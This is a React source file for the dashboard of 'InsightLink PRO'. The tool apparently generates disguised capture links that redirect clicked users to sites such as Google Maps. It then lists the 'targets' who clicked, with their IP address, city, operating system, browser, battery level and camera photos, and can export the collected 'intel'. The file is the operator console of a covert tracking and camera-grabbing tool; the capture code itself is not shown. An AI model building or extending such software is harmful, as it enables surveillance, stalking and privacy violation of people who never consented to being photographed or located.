
import React, { useState, useEffect, useMemo } from 'react';
import { Plus, Link as LinkIcon, Trash2, Shield, Camera, MapPin, Battery, Cpu, Copy, Check, RefreshCw, Globe, Wifi, Search, Download, AlertTriangle } from 'lucide-react';
import { LinkConfig, CaptureReport } from '../types';
import ReportDetail from './ReportDetail';

const Dashboard: React.FC = () => {
  const [links, setLinks] = useState<LinkConfig[]>([]);
  const [reports, setReports] = useState<CaptureReport[]>([]);
  const [redirectUrl, setRedirectUrl] = useState('');
  const [linkName, setLinkName] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [selectedReport, setSelectedReport] = useState<CaptureReport | null>(null);
  const [isSyncing, setIsSyncing] = useState(false);
  const [searchQuery, setSearchQuery] = useState('');

  useEffect(() => {
    const savedLinks = localStorage.getItem('il_links');
    if (savedLinks) setLinks(JSON.parse(savedLinks));
    
    fetchReports();
    const interval = setInterval(fetchReports, 15000); 
    return () => clearInterval(interval);
  }, []);

  const fetchReports = async () => {
    setIsSyncing(true);
    try {
      const res = await fetch('/api/all-reports');
      if (res.ok) {
        const data = await res.json();
        setReports(data);
      }
    } catch (err) {
      console.error('Local API unavailable.');
    } finally {
      setTimeout(() => setIsSyncing(false), 800);
    }
  };

  const createLink = () => {
    if (!redirectUrl) return;
    const newLink: LinkConfig = {
      id: Math.random().toString(36).substring(2, 9),
      name: linkName || 'NODE-' + (links.length + 1).toString().padStart(2, '0'),
      redirectUrl: redirectUrl.startsWith('http') ? redirectUrl : `https://${redirectUrl}`,
      createdAt: new Date().toISOString(),
    };
    const updatedLinks = [newLink, ...links];
    setLinks(updatedLinks);
    localStorage.setItem('il_links', JSON.stringify(updatedLinks));
    setRedirectUrl('');
    setLinkName('');
  };

  const deleteLink = (id: string) => {
    if (!confirm('Decommission this Node?')) return;
    const updated = links.filter(l => l.id !== id);
    setLinks(updated);
    localStorage.setItem('il_links', JSON.stringify(updated));
  };

  const copyLink = (id: string) => {
    const url = `${window.location.origin}/#/capture/${id}`;
    navigator.clipboard.writeText(url);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const downloadData = () => {
    const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(reports, null, 2));
    const downloadAnchorNode = document.createElement('a');
    downloadAnchorNode.setAttribute("href", dataStr);
    downloadAnchorNode.setAttribute("download", `insightlink_intel_${new Date().getTime()}.json`);
    document.body.appendChild(downloadAnchorNode);
    downloadAnchorNode.click();
    downloadAnchorNode.remove();
  };

  const filteredReports = useMemo(() => {
    return reports.filter(r => {
      const link = links.find(l => l.id === r.linkId);
      const search = searchQuery.toLowerCase();
      return (
        r.location.ip?.toLowerCase().includes(search) ||
        link?.name.toLowerCase().includes(search) ||
        r.device.os.toLowerCase().includes(search)
      );
    });
  }, [reports, searchQuery, links]);

  const stats = useMemo(() => ({
    total: reports.length,
    activeNodes: links.length,
    today: reports.filter(r => new Date(r.timestamp).toDateString() === new Date().toDateString()).length,
    uniqueIps: new Set(reports.map(r => r.location.ip)).size
  }), [reports, links]);

  const openReport = (e: React.MouseEvent, report: CaptureReport) => {
    e.stopPropagation();
    setSelectedReport(report);
  };

  return (
    <div className="max-w-7xl mx-auto px-4 py-8 md:py-12 animate-pop">
      {/* Top Navigation & Status */}
      <div className="flex flex-col lg:flex-row lg:items-center justify-between mb-10 gap-6">
        <div>
          <h1 className="text-3xl md:text-5xl font-black text-ink tracking-tighter flex items-center gap-4 italic uppercase">
            <div className="bg-brand-accent border-3 border-ink p-3 rotate-3 shadow-comic shrink-0">
              <Shield className="text-white" size={32} />
            </div>
            InsightLink <span className="text-brand-accent">PRO</span>
          </h1>
          <p className="text-ink/60 font-bold mt-2 flex items-center gap-2 text-sm uppercase tracking-widest">
            <Wifi size={16} className="text-brand-accent animate-pulse" /> 
            Command Center | Session Active
          </p>
        </div>
        
        <div className="flex flex-wrap items-center gap-3">
          <button 
            onClick={downloadData}
            disabled={reports.length === 0}
            className="comic-button bg-white px-5 py-3 border-3 border-ink flex items-center gap-2 font-black text-sm uppercase italic disabled:opacity-30"
          >
            <Download size={18} /> Export Intel
          </button>
          <button 
            onClick={fetchReports}
            className={`comic-button bg-pastel-yellow px-5 py-3 border-3 border-ink flex items-center gap-2 font-black text-sm uppercase italic transition-all ${isSyncing ? 'translate-y-1 shadow-none' : ''}`}
          >
            <RefreshCw size={18} className={isSyncing ? 'animate-spin' : ''} />
            Sync Feed
          </button>
        </div>
      </div>

      {/* Global Stats Bar */}
      <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-10">
        {[
          { label: 'Intelligence Captured', val: stats.total, icon: Camera, color: 'bg-pastel-blue' },
          { label: 'Active Nodes', val: stats.activeNodes, icon: LinkIcon, color: 'bg-pastel-pink' },
          { label: 'Sessions (24h)', val: stats.today, icon: Wifi, color: 'bg-pastel-green' },
          { label: 'Unique Targets', val: stats.uniqueIps, icon: Globe, color: 'bg-pastel-yellow' }
        ].map((s, i) => (
          <div key={i} className={`comic-card p-4 md:p-6 ${s.color} flex flex-col items-center text-center`}>
            <s.icon size={20} className="mb-2 text-ink/40" />
            <span className="text-2xl md:text-3xl font-black text-ink">{s.val}</span>
            <span className="text-[10px] font-black uppercase tracking-widest text-ink/40 mt-1">{s.label}</span>
          </div>
        ))}
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-10">
        {/* Left Sidebar: Controls */}
        <div className="lg:col-span-4 space-y-8">
          <div className="comic-card p-6 bg-white">
            <h2 className="text-xl font-black text-ink mb-6 flex items-center gap-3 italic uppercase">
              <Plus size={24} className="bg-brand-accent text-white border-2 border-ink p-1 rounded-md" />
              New Node Deploy
            </h2>
            <div className="space-y-5">
              <input
                type="text"
                placeholder="Target Alias (e.g. ALPHA-1)"
                className="w-full px-4 py-3 border-3 border-ink bg-paper outline-none font-bold placeholder:text-ink/20"
                value={linkName}
                onChange={(e) => setLinkName(e.target.value)}
              />
              <input
                type="text"
                placeholder="Redirect URL (e.g. maps.google.com)"
                className="w-full px-4 py-3 border-3 border-ink bg-paper outline-none font-bold placeholder:text-ink/20"
                value={redirectUrl}
                onChange={(e) => setRedirectUrl(e.target.value)}
              />
              <button
                onClick={createLink}
                className="w-full bg-ink text-white font-black py-4 border-3 border-ink shadow-comic hover:bg-brand-accent transition-colors uppercase italic tracking-tighter"
              >
                Establish Link
              </button>
            </div>
          </div>

          <div className="comic-card p-6 bg-white">
            <h2 className="text-xl font-black text-ink mb-6 flex items-center gap-3 italic uppercase">
              <Wifi size={24} className="bg-pastel-pink border-2 border-ink p-1 rounded-md" />
              Node Registry
            </h2>
            <div className="space-y-4 max-h-[350px] overflow-y-auto pr-2 custom-scrollbar">
              {links.length === 0 ? (
                <div className="text-center py-10 opacity-30 italic font-bold text-sm">No nodes initialized.</div>
              ) : (
                links.map((link) => (
                  <div key={link.id} className="p-4 bg-paper border-2 border-ink hover:bg-white transition-colors">
                    <div className="flex items-center justify-between mb-2">
                      <span className="font-black text-ink text-xs truncate uppercase italic">{link.name}</span>
                      <button onClick={() => deleteLink(link.id)} className="text-ink/20 hover:text-red-500 transition-colors">
                        <Trash2 size={16} />
                      </button>
                    </div>
                    <div className="flex items-center gap-2">
                      <div className="bg-white border-2 border-ink text-[10px] font-mono p-2 flex-1 truncate text-ink/60">
                        {link.id}
                      </div>
                      <button
                        onClick={() => copyLink(link.id)}
                        className={`p-2 border-2 border-ink transition-all ${copiedId === link.id ? 'bg-green-400' : 'bg-white'}`}
                      >
                        {copiedId === link.id ? <Check size={16} /> : <Copy size={16} />}
                      </button>
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>

        {/* Main Content: Intel Feed */}
        <div className="lg:col-span-8">
          <div className="comic-card h-full bg-white flex flex-col min-h-[600px]">
            {/* Intel Header */}
            <div className="px-6 py-5 border-b-3 border-ink flex flex-col sm:flex-row sm:items-center justify-between gap-4 bg-paper">
              <h2 className="text-2xl font-black text-ink italic uppercase tracking-tighter">Intel Database</h2>
              <div className="relative">
                <Search size={18} className="absolute left-3 top-1/2 -translate-y-1/2 text-ink/30" />
                <input 
                  type="text" 
                  placeholder="Filter Intelligence..." 
                  className="pl-10 pr-4 py-2 bg-white border-3 border-ink text-sm font-bold outline-none w-full sm:w-64"
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                />
              </div>
            </div>

            {/* Intel List */}
            <div className="flex-1 overflow-y-auto custom-scrollbar">
              {filteredReports.length === 0 ? (
                <div className="flex flex-col items-center justify-center py-32 text-center px-6">
                  <div className="w-20 h-20 bg-paper border-3 border-ink rounded-full flex items-center justify-center mb-6 shadow-comic rotate-12">
                    <AlertTriangle size={32} className="text-ink/10" />
                  </div>
                  <h3 className="font-black text-xl text-ink uppercase italic">No Matches Found</h3>
                  <p className="text-ink/40 font-bold mt-2 text-sm">Adjust filters or await incoming telemetry.</p>
                </div>
              ) : (
                <div className="divide-y-3 divide-ink">
                  {filteredReports.map((report, idx) => {
                    const node = links.find(l => l.id === report.linkId);
                    return (
                      <div 
                        key={idx} 
                        className="p-6 md:p-8 hover:bg-brand-accent/5 transition-all cursor-pointer group border-l-[12px] border-transparent hover:border-brand-accent" 
                        onClick={(e) => openReport(e, report)}
                      >
                        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-6">
                          <div className="flex items-center gap-6">
                            <div className="w-20 h-20 shrink-0 bg-paper border-3 border-ink shadow-comic-sm overflow-hidden rotate-2 group-hover:rotate-0 transition-transform">
                              {report.photos && report.photos.length > 0 ? (
                                <img src={report.photos[0]} className="w-full h-full object-cover grayscale group-hover:grayscale-0" alt="Intel" />
                              ) : (
                                <div className="w-full h-full flex items-center justify-center">
                                  <Camera size={24} className="text-ink/10" />
                                </div>
                              )}
                            </div>
                            <div className="min-w-0">
                              <div className="flex items-center gap-3 mb-2 flex-wrap">
                                <h3 className="font-black text-xl text-ink truncate tracking-tight uppercase">
                                  {report.location.ip || 'Unknown IP'}
                                </h3>
                                <span className="text-[9px] font-black uppercase italic bg-ink text-white px-2 py-0.5 rounded-sm">
                                  {node?.name || 'EXTERNAL'}
                                </span>
                                <span className="text-[9px] font-black uppercase italic bg-pastel-green border border-ink px-2 py-0.5 rounded-sm">
                                  {report.device.os}
                                </span>
                              </div>
                              <div className="flex flex-wrap gap-x-5 gap-y-1 text-ink/50">
                                <span className="text-xs font-bold flex items-center gap-1.5">
                                  <MapPin size={12} className="text-brand-accent" /> {report.location.city || 'Scanning...'}
                                </span>
                                <span className="text-xs font-bold flex items-center gap-1.5">
                                  <Battery size={12} /> {Math.round((report.battery?.level || 1) * 100)}%
                                </span>
                                <span className="text-xs font-bold flex items-center gap-1.5">
                                  <Cpu size={12} /> {report.device.browser}
                                </span>
                              </div>
                            </div>
                          </div>
                          <div className="flex flex-col items-end gap-2 w-full md:w-auto">
                            <span className="text-[10px] font-black text-ink/30 uppercase tracking-widest bg-paper px-2 py-1 border border-ink/5">
                              {new Date(report.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}
                            </span>
                            <button 
                              onClick={(e) => openReport(e, report)}
                              className="w-full md:w-auto bg-white hover:bg-ink hover:text-white border-3 border-ink px-5 py-2 font-black uppercase italic text-[10px] transition-all group-hover:shadow-comic-sm"
                            >
                              Full Report
                            </button>
                          </div>
                        </div>
                      </div>
                    );
                  })}
                </div>
              )}
            </div>
          </div>
        </div>
      </div>

      {selectedReport && (
        <ReportDetail report={selectedReport} onClose={() => setSelectedReport(null)} />
      )}

      <style>{`
        .custom-scrollbar::-webkit-scrollbar { width: 6px; }
        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
        .custom-scrollbar::-webkit-scrollbar-thumb { background: #1E293B; border-radius: 10px; }
      `}</style>
    </div>
  );
};

export default Dashboard;
